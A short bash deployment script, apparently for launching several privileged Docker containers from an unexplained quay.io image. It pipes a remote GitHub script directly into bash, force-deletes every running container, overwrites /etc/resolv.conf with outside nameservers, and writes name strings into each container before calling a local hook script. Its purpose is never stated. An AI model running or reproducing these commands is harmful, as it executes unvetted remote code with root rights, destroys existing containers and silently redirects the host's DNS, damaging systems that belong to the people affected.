#!/bin/bash
#0ct0pus_main

curl https://raw.githubusercontent.com/cata0nana/0ct0pus_main/main/stage_0.sh | bash

export su_img_2=$SUDO_USER
echo $su_img_2

export img="quay.io/xm0uray/0ct0pus_child_qu"
export host=$SUDO_USER"-gc-emma-"
export sess="p"
echo $img
docker rm -f $(docker ps -q) >> /dev/null 2>&1  
docker rmi -f $img >> /dev/null 2>&1  
#docker rmi -f $img2
echo -e "nameserver 103.86.96.100\nnameserver 103.86.99.100" >  /etc/resolv.conf

echo  "HOST : [" $host " ] " " | IMAGE_DOCKER : [ "$img " ]" $sess
for (( i=1; i <= 4; i++ )); do
  bash -c  "docker run -d --name $sess$i --privileged -v /sys/fs/cgroup:/sys/fs/cgroup:ro -h  $host$i  $img"
done

docker exec -it p1 /bin/bash -c 'echo -e "andromialwatid"  > /root/g00g' &&
docker exec -it p2 /bin/bash -c 'echo -e "andersonandr0w00"  > /root/g00g' &&
docker exec -it p3 /bin/bash -c 'echo -e "gorgegofin"  > /root/g00g' &&
docker exec -it p4 /bin/bash -c 'echo -e "abouichrine"  > /root/g00g'

export infos=$img"-gc-MAIN-Deploy_End loftbloom vovanvonvowe gorgegofin  abouichrine "
python3 /root/hassed/docker_hook.py $infos
#https://raw.githubusercontent.com/cata0nana/0ct0pus_main/main/stage_0.sh

#curl https://raw.githubusercontent.com/GH0STAV0/lsq_0_c/main/runn.sh 
#export img2="quay.io/xm0uray/site_5:tag1"
